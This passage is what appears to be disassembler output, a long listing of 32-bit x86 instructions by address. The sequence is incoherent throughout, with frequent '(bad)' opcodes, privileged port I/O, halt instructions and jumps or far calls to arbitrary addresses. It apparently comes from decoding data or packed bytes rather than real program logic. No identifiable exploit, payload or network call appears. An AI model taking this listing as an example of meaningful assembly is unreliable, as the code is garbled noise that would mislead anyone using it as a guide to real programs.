  429d73:	add    dh,BYTE PTR [ecx]
  429d75:	call   FWORD PTR ds:0x931802e7
  429d7b:	xor    al,0xb8
  429d7d:	(bad)  
  429d7f:	imul   ebx,eax,0xbeb75c94
  429d85:	pop    esi
  429d86:	or     BYTE PTR [eax+eiz*4+0x45fb7784],dh
  429d8d:	sub    al,0xd9
  429d8f:	and    al,0xfa
  429d91:	xchg   edx,eax
  429d92:	ret    0x8741
  429d95:	dec    esp
  429d96:	lock rol ch,1
  429d99:	retf   
  429d9a:	and    al,0x14
  429d9c:	fs mov dl,0xec
  429d9f:	jmp    0xcd12ebd4
  429da4:	push   ebp
  429da5:	push   0x34c98767
  429daa:	imul   esp,DWORD PTR [eax-0x2ab7e277],0xe1d1e0e8
  429db4:	and    al,0xdc
  429db6:	in     al,0xa1
  429db8:	iret   
  429db9:	or     BYTE PTR [esi+0x7649d916],al
  429dbf:	sbb    bl,cl
  429dc1:	in     eax,0x51
  429dc3:	test   eax,0x67d9130c
  429dc8:	mov    edi,0x7afa0741
  429dcd:	popf   
  429dce:	sub    ah,BYTE PTR fs:[eax+eiz*8-0x60]
  429dd3:	ret    
  429dd4:	cmp    eax,0x67829a31
  429dd9:	xchg   ecx,eax
  429dda:	sahf   
  429ddb:	nop
  429ddc:	ss jb  0x429e59
  429ddf:	imul   ecx,DWORD PTR [ebx],0xffffff9e
  429de2:	sbb    edi,ecx
  429de4:	xchg   ebx,eax
  429de5:	jmp    0xb70163fa
  429dea:	or     BYTE PTR [esi+0x37579b1f],bl
  429df0:	not    DWORD PTR [edx+eiz*1-0x79]
  429df4:	mov    al,ds:0xa9274454
  429df9:	mov    cl,0x1c
  429dfb:	std    
  429dfc:	pop    edi
  429dfd:	adc    BYTE PTR [esp+ebp*1],bh
  429e00:	shl    BYTE PTR [esi],1
  429e02:	pop    esp
  429e03:	dec    ebx
  429e04:	mov    ds:0xae1c9592,eax
  429e09:	daa    
  429e0a:	dec    ebp
  429e0b:	mov    eax,0x90602e94
  429e10:	xor    al,0x63
  429e12:	shl    BYTE PTR [ecx],0x91
  429e15:	and    eax,0x17a35350
  429e1a:	ins    DWORD PTR es:[edi],dx
  429e1b:	hlt    
  429e1c:	mov    ebp,0x9e1299ce
  429e21:	and    edx,DWORD PTR [ebx+0x61]
  429e24:	adc    bh,BYTE PTR [edx-0x6743a839]
  429e2a:	pop    ss
  429e2b:	and    BYTE PTR [ebx-0x353da3de],0x5c
  429e32:	subps  xmm4,xmm3
  429e35:	into   
  429e36:	inc    edx
  429e37:	xor    BYTE PTR [ebp-0x7c45f85f],0xcf
  429e3e:	fmul   DWORD PTR [edi-0x6f]
  429e41:	mov    ch,0xa0
  429e43:	push   ebp
  429e44:	mov    ebx,0xe47a086e
  429e49:	test   DWORD PTR [ebx-0x1b],esp
  429e4c:	(bad)  
  429e4d:	jle    0x429e51
  429e4f:	pushf  
  429e50:	jo     0x429e17
  429e52:	dec    ecx
  429e53:	fsubr  QWORD PTR gs:[esi-0x72]
  429e57:	mov    bl,0x30
  429e59:	ret    
  429e5a:	fimul  DWORD PTR [edi+0x1]
  429e5d:	xchg   edi,eax
  429e5e:	in     eax,dx
  429e5f:	dec    ebp
  429e60:	push   cs
  429e61:	xor    al,0x91
  429e63:	popf   
  429e64:	and    BYTE PTR [edx+0x994d504],ah
  429e6a:	sti    
  429e6b:	ja     0x429e24
  429e6d:	and    DWORD PTR [ecx+0x5bc6894],ebx
  429e73:	mov    eax,0xcc4c39ca
  429e78:	(bad)
  429e7b:	mov    al,al
  429e7d:	in     al,dx
  429e7e:	push   cs
  429e7f:	and    DWORD PTR [ebp+0x2],eax
  429e82:	das    
  429e83:	and    BYTE PTR es:[ebx-0x6cc1016d],dh
  429e8a:	inc    esi
  429e8b:	mov    ecx,0xb25d60ac
  429e90:	mov    bh,BYTE PTR [edi+0x14cab9a4]
  429e96:	xchg   edi,eax
  429e97:	scas   eax,DWORD PTR es:[edi]
  429e98:	(bad)  
  429e99:	cmp    al,0x96
  429e9b:	mov    ecx,0x1fc68423
  429ea0:	xchg   BYTE PTR [esi+0x386e3f9],ch
  429ea6:	sar    BYTE PTR [ebx-0x7b],0x69
  429eaa:	sar    DWORD PTR [eax+edx*8-0x51267aad],0x37
  429eb2:	ss push cs
  429eb4:	loope  0x429f30
  429eb6:	add    DWORD PTR [esi],esp
  429eb8:	pushf  
  429eb9:	xor    eax,0x7f625576
  429ebe:	cdq    
  429ebf:	pop    ds
  429ec0:	jp     0x429f2a
  429ec2:	stc    
  429ec3:	ds dec ebp
  429ec5:	add    BYTE PTR [ecx+ebx*1+0x614bc004],cl
  429ecc:	aaa    
  429ecd:	dec    esi
  429ece:	adc    al,0xac
  429ed0:	push   0xffffffb3
  429ed2:	xchg   ebx,eax
  429ed3:	add    BYTE PTR [ecx],ch
  429ed5:	into   
  429ed6:	sti    
  429ed7:	mov    ds:0x8674ca64,eax
  429edc:	jno    0x429ece
  429ede:	repnz sbb al,0xda
  429ee1:	dec    eax
  429ee2:	mov    al,0x65
  429ee4:	fsubr  QWORD PTR [esi]
  429ee6:	mov    WORD PTR [eax-0x4c],cs
  429ee9:	xlat   BYTE PTR ds:[ebx]
  429eea:	out    0x93,eax
  429eec:	sub    ch,cl
  429eee:	pop    ss
  429eef:	xor    DWORD PTR [edi+0x28],ecx
  429ef2:	daa    
  429ef3:	dec    ebp
  429ef4:	out    0x62,al
  429ef6:	mov    esi,0xdfe5ab2a
  429efb:	ret    0xece9
  429efe:	mov    cl,0xd2
  429f00:	cmp    al,0xd1
  429f02:	test   BYTE PTR [ebx],bh
  429f04:	and    eax,0x9797cd33
  429f09:	shl    BYTE PTR [ecx+0x366d1f15],1
  429f0f:	loope  0x429f0b
  429f11:	jl     0x429f2d
  429f13:	retf   0x6d6
  429f16:	xchg   esp,eax
  429f17:	data16 or bh,al
  429f1a:	sbb    eax,0xfc210009
  429f1f:	inc    esi
  429f20:	or     eax,0x80e7827b
  429f25:	popf   
  429f26:	cdq    
  429f27:	push   0xffffffc8
  429f29:	shr    DWORD PTR [edi+0x491b02a5],cl
  429f2f:	and    BYTE PTR [ecx+0x63],bl
  429f32:	mov    cl,BYTE PTR [ecx-0x3bbfec9c]
  429f38:	jae    0x429f3f
  429f3a:	lods   al,BYTE PTR ds:[esi]
  429f3b:	adc    DWORD PTR [esi],esp
  429f3d:	ror    BYTE PTR [esi+0x1a],0x71
  429f41:	inc    ebx
  429f42:	jae    0x429f58
  429f44:	ret    
  429f45:	lods   eax,DWORD PTR ds:[esi]
  429f46:	outs   dx,BYTE PTR ds:[esi]
  429f47:	cmp    bl,cl
  429f49:	add    eax,0xf0dc064c
  429f4e:	dec    esi
  429f4f:	out    0xe0,eax
  429f51:	out    dx,al
  429f52:	cmc    
  429f53:	loope  0x429efe
  429f55:	push   edi
  429f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f57:	push   ebp
  429f58:	fdivr  DWORD PTR [edx-0x27]
  429f5b:	out    0x87,eax
  429f5d:	xor    al,0xb7
  429f5f:	or     BYTE PTR [esi-0x3126ed0f],0x34
  429f66:	inc    ecx
  429f67:	je     0x429f60
  429f69:	and    esi,DWORD PTR [ebp+0x6e]
  429f6c:	cmp    al,0x6f
  429f6e:	(bad)  
  429f6f:	pusha  
  429f70:	(bad)  
  429f72:	sbb    BYTE PTR [esi-0x4b68a4f5],dh
  429f78:	loopne 0x429f39
  429f7a:	pop    edx
  429f7b:	sbb    eax,0x684c6874
  429f80:	hlt    
  429f81:	adc    ebp,DWORD PTR [edx+0x58]
  429f84:	stos   BYTE PTR es:[edi],al
  429f85:	loop   0x429f14
  429f87:	pushf  
  429f88:	adc    esi,DWORD PTR ds:0x7e5d1597
  429f8e:	cmp    BYTE PTR [ecx-0x2421d51b],0xe9
  429f95:	ret    0x72aa
  429f98:	push   ds
  429f99:	dec    esi
  429f9a:	inc    edx
  429f9b:	adc    edi,esp
  429f9d:	(bad)  
  429f9e:	daa    
  429f9f:	push   esi
  429fa0:	rcr    BYTE PTR [ebp-0x7b],cl
  429fa3:	push   esp
  429fa4:	addr16 out dx,al
  429fa6:	mov    bh,0x2c
  429fa8:	je     0x429f71
  429faa:	push   es
  429fab:	(bad)  [edi-0x3a]
  429fae:	not    BYTE PTR [edi+0x5c]
  429fb1:	mov    esp,0x2e8099c2
  429fb6:	call   0xfdf274cb
  429fbb:	lea    esp,[ecx-0x4d8868d7]
  429fc1:	xor    ecx,DWORD PTR [ebp+ebp*8+0x310a763c]
  429fc8:	lds    edi,FWORD PTR [eax-0x74]
  429fcb:	ds call 0xa9eb10be
  429fd1:	ror    cl,0xc5
  429fd4:	or     bl,cl
  429fd6:	out    dx,eax
  429fd7:	hlt    
  429fd8:	sub    al,0x52
  429fda:	or     eax,0x22361b47
  429fdf:	(bad)  
  429fe0:	outs   dx,BYTE PTR ds:[esi]
  429fe1:	ret    
  429fe2:	mov    edx,0x5ff4160d
  429fe7:	and    al,0x53
  429fe9:	xor    DWORD PTR [esi-0x1c],0x5a12c8d4
  429ff0:	int    0x12
  429ff2:	(bad)  
  429ff3:	loopne 0x429ffd
  429ff5:	bound  esi,QWORD PTR ds:0x932e74d9
  429ffb:	sbb    DWORD PTR [edx+0x54f183d5],edx
  42a001:	sbb    cl,BYTE PTR [ebx-0x7]
  42a004:	xor    cl,BYTE PTR [edx]
  42a006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a007:	rcl    edx,0xf4
  42a00a:	jnp    0x429f97
  42a00c:	xlat   BYTE PTR ds:[ebx]
  42a00d:	xchg   BYTE PTR [eax],dh
  42a00f:	inc    ecx
  42a010:	jp     0x429fa3
  42a012:	pop    ebx
  42a013:	pusha  
  42a014:	and    eax,0x4239818
  42a019:	je     0x42a046
  42a01b:	in     eax,dx
  42a01c:	lods   al,BYTE PTR ds:[esi]
  42a01d:	mov    ch,0x1b
  42a01f:	add    cl,BYTE PTR [eax-0x69]
  42a022:	dec    esp
  42a023:	cmp    BYTE PTR [ecx+0x8],al
  42a026:	sub    BYTE PTR [edx],ah
  42a028:	jp     0x429fd8
  42a02a:	dec    ecx
  42a02b:	or     BYTE PTR [ecx-0x49],0xbc
  42a02f:	fsubr  QWORD PTR [ebx+0x758b3e61]
  42a035:	and    al,0x0
  42a037:	pop    esi
  42a038:	rcl    BYTE PTR [esi],cl
  42a03a:	jnp    0x42a084
  42a03c:	pop    ebx
  42a03d:	jo     0x42a00d
  42a03f:	xchg   esp,eax
  42a040:	push   esp
  42a041:	mov    ah,0xd
  42a043:	into   
  42a044:	jo     0x42a01c
  42a046:	pop    eax
  42a047:	add    edi,eax
  42a049:	dec    esi
  42a04a:	sub    al,0x63
  42a04c:	mov    DWORD PTR [ecx+esi*4+0x2931b0bb],esi
  42a053:	xchg   ebx,edx
  42a055:	test   bl,al
  42a057:	fimul  DWORD PTR [edi+0x2e]
  42a05a:	enter  0x6971,0xd7
  42a05e:	dec    esi
  42a05f:	inc    eax
  42a060:	ja     0x42a048
  42a062:	xor    DWORD PTR [ecx+0x7aaf9886],esi
  42a068:	call   0xae0ef587
  42a06d:	inc    eax
  42a06e:	push   ds
  42a06f:	fdivr  QWORD PTR [ecx-0x66]
  42a072:	stos   DWORD PTR es:[edi],eax
  42a073:	out    0xb6,eax
  42a075:	pop    esi
  42a076:	arpl   WORD PTR [edi],sp
  42a078:	pop    eax
  42a079:	ins    BYTE PTR es:[edi],dx
  42a07a:	pop    es
  42a07b:	popf   
  42a07c:	arpl   WORD PTR [eax+0x49],bx
  42a07f:	jno    0x42a01d
  42a081:	pop    ebp
  42a082:	adc    eax,ebx
  42a084:	push   ebx
  42a085:	jae    0x42a100
  42a087:	js     0x42a06e
  42a089:	or     al,0xa1
  42a08b:	and    BYTE PTR [edi],cl
  42a08d:	adc    al,BYTE PTR [esi+ebx*1+0x300bc3e3]
  42a094:	rcl    DWORD PTR [edi],cl
  42a096:	gs ja  0x42a0a9
  42a099:	in     eax,0x4a
  42a09b:	add    eax,0xf1e6ab9f
  42a0a0:	test   al,0x6c
  42a0a2:	rol    DWORD PTR [edi-0x3c0eba49],0x13
  42a0a9:	repz and BYTE PTR [ecx+0x5],0x5f
  42a0ae:	pop    ss
  42a0af:	mov    ah,0xf1
  42a0b1:	mov    ecx,0x142dc3e5
  42a0b6:	or     eax,0x6a2d8e17
  42a0bb:	aas    
  42a0bc:	mov    ecx,0x29a6b85c
  42a0c1:	push   cs
  42a0c2:	and    edi,ecx
  42a0c4:	addr16 pop esi
  42a0c6:	fucomi st,st(3)
  42a0c8:	dec    esp
  42a0c9:	and    al,0x12
  42a0cb:	test   BYTE PTR [esi+0x7d],cl
  42a0ce:	outs   dx,BYTE PTR ds:[esi]
  42a0cf:	in     al,0xd1
  42a0d1:	addr16 out 0x32,eax
  42a0d4:	aaa    
  42a0d5:	arpl   WORD PTR [ecx+0x3465f740],cx
  42a0db:	loope  0x42a0c7
  42a0dd:	push   esi
  42a0de:	jp     0x42a0a2
  42a0e0:	add    al,0x48
  42a0e2:	shl    ebx,1
  42a0e4:	aam    0xfc
  42a0e6:	mov    edx,0xe4d87800
  42a0eb:	test   ch,al
  42a0ed:	jecxz  0x42a0b3
  42a0ef:	stc    
  42a0f0:	fs push ds
  42a0f2:	sub    eax,0xfdfef084
  42a0f7:	pop    ebp
  42a0f8:	sbb    eax,0x8c2f038
  42a0fd:	sub    al,0x34
  42a0ff:	loope  0x42a123
  42a101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a102:	mov    edi,0xbda8b5e2
  42a107:	adc    BYTE PTR [esi-0x6f],cl
  42a10a:	loopne 0x42a10f
  42a10c:	or     DWORD PTR [esi-0x2cf670ca],ecx
  42a112:	pop    ecx
  42a113:	test   al,0xcd
  42a115:	inc    ecx
  42a116:	addr16 dec esp
  42a118:	push   cs
  42a119:	pop    eax
  42a11a:	dec    eax
  42a11b:	xor    DWORD PTR [ecx+ebx*8+0x744b2a6a],esi
  42a122:	fadd   DWORD PTR [esi-0x36]
  42a125:	push   edx
  42a126:	xchg   esp,eax
  42a127:	(bad)  
  42a128:	out    0x52,eax
  42a12a:	mov    ah,0x4f
  42a12c:	fdivr  QWORD PTR [eax+0x17]
  42a12f:	mov    eax,ds:0x1d756541
  42a134:	xchg   DWORD PTR fs:[edi+eiz*4-0x5a9e8182],ecx
  42a13c:	push   ebp
  42a13d:	sbb    dl,BYTE PTR [edi-0x18bdd0fe]
  42a143:	int    0xe0
  42a145:	cmc    
  42a146:	mov    ebx,0x98c016aa
  42a14b:	outs   dx,BYTE PTR ds:[esi]
  42a14c:	leave  
  42a14d:	mov    al,0x26
  42a14f:	push   es
  42a150:	mov    ebp,0x4449c2
  42a155:	test   BYTE PTR [ebx],dl
  42a157:	xor    BYTE PTR [ebx+0x77],ch
  42a15a:	and    BYTE PTR [eax-0x75],al
  42a15d:	shl    BYTE PTR [edi+esi*4+0x12b92d05],1
  42a164:	dec    esi
  42a165:	adc    ah,BYTE PTR [ecx+ecx*8]
  42a168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a169:	retf   
  42a16a:	mov    al,0x34
  42a16c:	jp     0x42a15e
  42a16e:	out    dx,al
  42a16f:	out    0x27,eax
  42a171:	jo     0x42a180
  42a173:	sbb    DWORD PTR ds:0xb3dc825d,edx
  42a179:	push   esi
  42a17a:	lds    eax,FWORD PTR ds:0xc567fcfa
  42a180:	(bad)  
  42a181:	mov    al,ds:0x6549062f
  42a186:	daa    
  42a187:	dec    ecx
  42a188:	retf   
  42a189:	(bad)  
  42a18a:	rcr    DWORD PTR [ebp+0x62b5987e],cl
  42a190:	les    esp,FWORD PTR [edx-0x7d]
  42a193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a194:	and    eax,0x49134b82
  42a199:	cld    
  42a19a:	in     eax,0xee
  42a19c:	outs   dx,BYTE PTR ds:[esi]
  42a19d:	or     al,0xcc
  42a19f:	and    al,0x31
  42a1a1:	xor    edx,DWORD PTR [ebx+0x44c56cc0]
  42a1a7:	jnp    0x42a185
  42a1a9:	mov    WORD PTR [esi-0x7e],cs
  42a1ac:	inc    ebx
  42a1ad:	sti    
  42a1ae:	call   0x14d0:0x172358ed
  42a1b5:	(bad)  
  42a1b6:	jecxz  0x42a18d
  42a1b8:	jle    0x42a1ff
  42a1ba:	adc    eax,0xa735e200
  42a1bf:	or     DWORD PTR [edx],eax
  42a1c1:	out    dx,al
  42a1c2:	or     esi,0x952cf83c
  42a1c8:	pop    ecx
  42a1c9:	nop
  42a1ca:	sbb    ecx,edi
  42a1cc:	fiadd  WORD PTR [edx-0x7a]
  42a1cf:	lea    ebx,[edi]
  42a1d1:	xchg   BYTE PTR [esi+0x2c49c2b0],bl
  42a1d7:	push   ds
  42a1d8:	ret    
  42a1d9:	loope  0x42a1c2
  42a1db:	cmp    DWORD PTR [eax+0x249991b6],eax
  42a1e1:	push   esp
  42a1e2:	jl     0x42a16a
  42a1e4:	lods   al,BYTE PTR ds:[esi]
  42a1e5:	pop    ss
  42a1e6:	cmc    
  42a1e7:	jo     0x42a215
  42a1e9:	shr    BYTE PTR [esi+0x1a],cl
  42a1ec:	mov    eax,ds:0xb41da49
  42a1f1:	in     al,dx
  42a1f2:	int    0xc8
  42a1f4:	mov    al,0x39
  42a1f6:	jmp    0x232f911b
  42a1fb:	int    0xe3
  42a1fd:	xchg   bh,al
  42a1ff:	addr16 inc ecx
  42a201:	xor    BYTE PTR [esi],0xee
  42a204:	clc    
  42a205:	js     0x42a20d
  42a207:	xchg   ebp,eax
  42a208:	mov    ecx,0x3ad1b234
  42a20d:	add    al,0x22
  42a20f:	shr    DWORD PTR ss:0x2bc68701,1
  42a216:	sub    BYTE PTR [edx-0x1a356083],dl
  42a21c:	loope  0x42a290
  42a21e:	fnstenv [ecx]
  42a220:	sub    edi,DWORD PTR [edx-0x170daadb]
  42a226:	es in  eax,dx
  42a228:	pop    edi
  42a229:	mov    al,ds:0x43b0b79
  42a22e:	and    eax,0x34b709b8
  42a233:	cmp    ah,al
  42a235:	repnz xchg esp,eax
  42a237:	jno    0x42a2a9
  42a239:	mov    al,0x86
  42a23b:	sub    al,0x1d
  42a23d:	cli    
  42a23e:	outs   dx,BYTE PTR ds:[esi]
  42a23f:	jnp    0x42a256
  42a241:	xchg   edi,eax
  42a242:	xor    ecx,DWORD PTR [edx-0x591a68b6]
  42a248:	xlat   BYTE PTR ds:[ebx]
  42a249:	outs   dx,BYTE PTR ds:[esi]
  42a24a:	or     BYTE PTR [ebp-0x67d6bc43],0xa6
  42a251:	repnz stos BYTE PTR es:[edi],al
  42a253:	(bad)  
  42a254:	sbb    eax,DWORD PTR [eax-0x4e3f6c32]
  42a25a:	jmp    DWORD PTR [ecx+eiz*8-0x45e1820]
  42a261:	add    edi,DWORD PTR [esi+eax*4]
  42a264:	add    ebp,DWORD PTR [edi+0x34]
  42a267:	std    
  42a268:	fs call 0x26e5a36c
  42a26e:	xor    al,0x7a
  42a270:	call   DWORD PTR [edi+0x18]
  42a273:	gs or  eax,0x7339e07
  42a279:	cdq    
  42a27a:	dec    esi
  42a27b:	mov    ecx,DWORD PTR [ebp-0x51]
  42a27e:	and    BYTE PTR [edx+ebx*8+0x30],dh
  42a282:	into   
  42a283:	adc    DWORD PTR [eax-0x476718be],ecx
  42a289:	in     eax,dx
  42a28a:	jp     0x42a295
  42a28c:	stc    
  42a28d:	xchg   esp,eax
  42a28e:	sbb    eax,0x520bbb69
  42a293:	les    eax,FWORD PTR [ecx+0x3873e783]
  42a299:	adc    ecx,DWORD PTR ds:0xc2485c22
  42a29f:	ja     0x42a2c6
  42a2a1:	mov    DWORD PTR [ebx+ecx*1+0x70],ebx
  42a2a5:	dec    edx
  42a2a6:	icebp  
  42a2a7:	inc    ecx
  42a2a8:	xor    ah,ch
  42a2aa:	ror    DWORD PTR [esi+0x73],1
  42a2ad:	jbe    0x42a2ce
  42a2af:	dec    ecx
  42a2b0:	mov    ch,0xcb
  42a2b2:	je     0x42a247
  42a2b4:	imul   ebp,DWORD PTR [ecx-0x1d],0x3e
  42a2b8:	push   edi
  42a2b9:	outs   dx,DWORD PTR ds:[esi]
  42a2ba:	xchg   DWORD PTR [ebx-0x765e1830],edx
  42a2c0:	mov    ah,0x1a
  42a2c2:	and    bh,ah
  42a2c4:	scas   eax,DWORD PTR es:[edi]
  42a2c5:	dec    esp
  42a2c6:	cdq    
  42a2c7:	mul    cl
  42a2c9:	repnz mov bl,0x9
  42a2cc:	call   0xa395:0xc817ee70
  42a2d3:	imul   ebp,ebp,0xf527030
  42a2d9:	pop    ds
  42a2da:	push   0xb848a68f
  42a2df:	in     eax,0xdd
  42a2e1:	lods   al,BYTE PTR ds:[esi]
  42a2e2:	ss xchg esi,eax
  42a2e4:	mov    dl,0x61
  42a2e6:	mov    es,esp
  42a2e8:	out    0x52,eax
  42a2ea:	push   es
  42a2eb:	mov    eax,ds:0x41f3e9c1
  42a2f0:	call   0x315ed579
  42a2f5:	jecxz  0x42a2d5
  42a2f7:	mov    BYTE PTR [edi+0x6a],dh
  42a2fa:	test   eax,0xeb16a3c0
  42a2ff:	mov    dh,BYTE PTR [eax]
  42a301:	jge    0x42a29d
  42a303:	data16 je 0x42a35e
  42a306:	test   BYTE PTR [eax-0x7aec6b37],dl
  42a30c:	jo     0x42a329
  42a30e:	ret    
  42a30f:	push   cs
  42a310:	cmp    BYTE PTR [edx],ch
  42a312:	add    eax,0x66cdd02c
  42a317:	int    0x1e
  42a319:	fcomp  QWORD PTR [edx-0x59]
  42a31c:	loopne 0x42a2f7
  42a31e:	loope  0x42a345
  42a320:	mov    WORD PTR [ebp+0x141ad8cd],ss
  42a326:	in     al,dx
  42a327:	fisub  DWORD PTR [esp+ecx*1+0x3ecb61e8]
  42a32e:	adc    esp,DWORD PTR [esi-0x35]
  42a331:	push   cs
  42a332:	inc    esp
  42a333:	sub    al,0x32
  42a335:	sub    DWORD PTR [edx+edx*1-0x77c337c6],ecx
  42a33c:	push   edi
  42a33d:	add    eax,0x42e0b20a
  42a342:	mov    dl,0x82
  42a344:	scas   eax,DWORD PTR es:[edi]
  42a345:	jne    0x42a37e
  42a347:	pusha  
  42a348:	repz lea eax,[esp+eiz*2-0x1c6bea39]
  42a350:	sub    DWORD PTR [ebx+esi*8],edi
  42a353:	loop   0x42a319
  42a355:	jmp    FWORD PTR [edi]
  42a357:	pop    edx
  42a358:	out    0xde,al
  42a35a:	sbb    BYTE PTR [edx+ecx*8],0x95
  42a35e:	cmp    al,0x6
  42a360:	dec    edx
  42a361:	xor    dh,cl
  42a363:	push   es
  42a364:	jecxz  0x42a382
  42a366:	add    BYTE PTR [edi+0x7d8c161],bl
  42a36c:	and    BYTE PTR [eax+0x5e],bl
  42a36f:	or     bh,BYTE PTR [ebx]
  42a371:	(bad)  [eax+0x21]
  42a374:	or     DWORD PTR [ebp-0x6b29e830],esp
  42a37a:	sub    bh,BYTE PTR [eax+0x1ebbbc24]
  42a380:	mov    dl,0x77
  42a382:	pop    ebp
  42a383:	dec    esi
  42a384:	cmp    al,0x72
  42a386:	bound  eax,QWORD PTR [esi]
  42a388:	mov    ebx,0x823a0a7d
  42a38d:	mov    ah,0x91
  42a38f:	imul   esp,DWORD PTR ds:0x1629e93a,0xf37be8fa
  42a399:	retf   
  42a39a:	pop    esi
  42a39b:	pop    edx
  42a39c:	xor    eax,ecx
  42a39e:	mov    dh,0xb3
  42a3a0:	adc    eax,0xb7927e1b
  42a3a5:	rcl    BYTE PTR [ebx],0x73
  42a3a8:	mov    eax,ds:0x24a07662
  42a3ad:	xchg   edx,eax
  42a3ae:	popa   
  42a3af:	pop    edx
  42a3b0:	and    edi,DWORD PTR [eax-0x4cae6cce]
  42a3b6:	sahf   
  42a3b7:	dec    edx
  42a3b8:	es sbb ecx,esp
  42a3bb:	add    al,0xbf
  42a3bd:	ja     0x42a350
  42a3bf:	xor    al,0xdc
  42a3c1:	aad    0xe3
  42a3c3:	inc    edx
  42a3c4:	jae    0x42a3f0
  42a3c6:	mov    edx,esi
  42a3c8:	fsubr  QWORD PTR [esi+edi*8]
  42a3cb:	jo     0x42a411
  42a3cd:	outs   dx,DWORD PTR ds:[esi]
  42a3ce:	inc    al
  42a3d0:	leave  
  42a3d1:	cs mov bl,0xd0
  42a3d4:	fwait
  42a3d5:	popa   
  42a3d6:	sbb    BYTE PTR [ecx+0x720378ee],bh
  42a3dc:	int    0xb6
  42a3de:	xchg   ecx,eax
  42a3df:	repz iret 
  42a3e1:	fcom   st(2)
  42a3e3:	cdq    
  42a3e4:	ret    
  42a3e5:	push   ebp
  42a3e6:	lods   al,BYTE PTR ds:[esi]
  42a3e7:	mov    ch,0xd8
  42a3e9:	xchg   ecx,eax
  42a3ea:	(bad)
  42a3ed:	js     0x42a43f
  42a3ef:	cmp    BYTE PTR [ebp+0x1af22c53],dh
  42a3f5:	cli    
  42a3f6:	loop   0x42a40a
  42a3f8:	fnsave [esi+ecx*4+0x4ec8167e]
  42a3ff:	or     esp,DWORD PTR ds:0x9b76686a
  42a405:	lock retf 0x35ce
  42a409:	pop    eax
  42a40a:	and    al,0xcd
  42a40c:	sbb    eax,0x28a0b3ab
  42a411:	retf   0x2758
  42a414:	mov    bl,0xa8
  42a416:	in     al,0xa
  42a418:	lock push es
  42a41a:	sbb    eax,0xad208378
  42a41f:	fninit 
  42a421:	test   ebx,ecx
  42a423:	push   di
  42a425:	sub    esp,eax
  42a427:	cs into 
  42a429:	das    
  42a42a:	rol    DWORD PTR [ecx+0x1a],0xae
  42a42e:	test   DWORD PTR [edx+edi*4],esp
  42a431:	push   edx
  42a432:	sub    edx,DWORD PTR [edx+0x66cf4b8d]
  42a438:	xchg   ebp,eax
  42a439:	aad    0x9e
  42a43b:	lock cmp ebp,edx
  42a43e:	popf   
  42a43f:	js     0x42a4b6
  42a441:	mov    ds:0x25529c80,al
  42a446:	sub    eax,0x6d1cc560
  42a44b:	nop
  42a44c:	push   es
  42a44d:	sbb    ebx,ecx
  42a44f:	(bad)  
  42a450:	fs cmp ebp,esi
  42a453:	lods   eax,DWORD PTR ds:[esi]
  42a454:	mov    bh,0x61
  42a456:	jge    0x42a40b
  42a458:	add    eax,0xd51e4279
  42a45d:	xlat   BYTE PTR ds:[ebx]
  42a45e:	xchg   edx,eax
  42a45f:	mov    BYTE PTR ds:0x7a0578cb,dl
  42a465:	fmul   DWORD PTR [ebx+0x60d39b17]
  42a46b:	fstp   DWORD PTR [ecx+0x67]
  42a46e:	test   cl,dh
  42a470:	pop    esp
  42a471:	loope  0x42a439
  42a473:	mov    cl,0x70
  42a475:	pop    es
  42a476:	hlt    
  42a477:	push   eax
  42a478:	sbb    bl,al
  42a47a:	jle    0x42a4b2
  42a47c:	pop    es
  42a47d:	pop    eax
  42a47e:	add    BYTE PTR [eax],dh
  42a480:	ret    0x41ca
  42a483:	(bad)  
  42a484:	sbb    BYTE PTR [eax-0xe],dh
  42a487:	or     al,0x9b
  42a489:	pop    eax
  42a48a:	inc    esi
  42a48b:	daa    
  42a48c:	call   0x46ae:0x230861b1
  42a493:	dec    ebp
  42a494:	adc    BYTE PTR [ebx+edx*8],dh
  42a497:	pop    es
  42a498:	cmp    ch,cl
  42a49a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a49b:	loope  0x42a4ab
  42a49d:	pop    ss
  42a49e:	dec    esp
  42a49f:	xor    DWORD PTR [edi],esp
  42a4a1:	or     BYTE PTR [eax-0x1e],cl
  42a4a4:	inc    edx
  42a4a5:	fld    DWORD PTR [esi-0x66]
  42a4a8:	fild   DWORD PTR [ebp+0x2c02ccf9]
  42a4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4af:	and    al,BYTE PTR [edx-0x4c]
  42a4b2:	leave  
  42a4b3:	or     eax,DWORD PTR [ecx+ecx*4]
  42a4b6:	jmp    0x42a480
  42a4b8:	and    al,0xdb
  42a4ba:	cmp    eax,0x29ef4736
  42a4bf:	sbb    BYTE PTR [esi],dl
  42a4c1:	or     eax,0x88c2fa17
  42a4c6:	xor    eax,0x67edf1b9
  42a4cb:	inc    edi
  42a4cc:	jno    0x42a4b9
  42a4ce:	jmp    0x3ed5:0xc58fce18
  42a4d5:	or     al,0xb7
  42a4d7:	aad    0xca
  42a4d9:	mov    eax,0x89415e7e
  42a4de:	scas   al,BYTE PTR es:[edi]
  42a4df:	and    eax,0xa690d110
  42a4e4:	cmc    
  42a4e5:	sbb    BYTE PTR ds:0x2317b526,ch
  42a4eb:	inc    esi
  42a4ec:	inc    eax
  42a4ed:	minps  xmm6,XMMWORD PTR [edx-0x30be0b90]
  42a4f4:	jnp    0x42a556
  42a4f6:	and    dl,BYTE PTR [eax]
  42a4f8:	jbe    0x42a4f6
  42a4fa:	jno    0x42a4a0
  42a4fc:	and    BYTE PTR ds:0x29c1f23d,cl
  42a502:	ror    BYTE PTR [esi+ebx*4-0x3d],1
  42a506:	imul   esp,ebp,0xafbcc9c2
  42a50c:	(bad)  
  42a50d:	(bad)  
  42a50e:	jnp    0x42a551
  42a510:	push   ecx
  42a511:	dec    ebp
  42a512:	add    dh,cl
  42a514:	jae    0x42a58e
  42a516:	and    eax,0xfffffffc
  42a519:	xchg   ebx,eax
  42a51a:	push   esi
  42a51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a51c:	stos   BYTE PTR es:[edi],al
  42a51d:	leave  
  42a51e:	jnp    0x42a569
  42a520:	shr    BYTE PTR [edi-0xe],1
  42a523:	sub    BYTE PTR [eax-0x2c77b658],bl
  42a529:	sbb    DWORD PTR [edx],esi
  42a52b:	adc    esp,esi
  42a52d:	das    
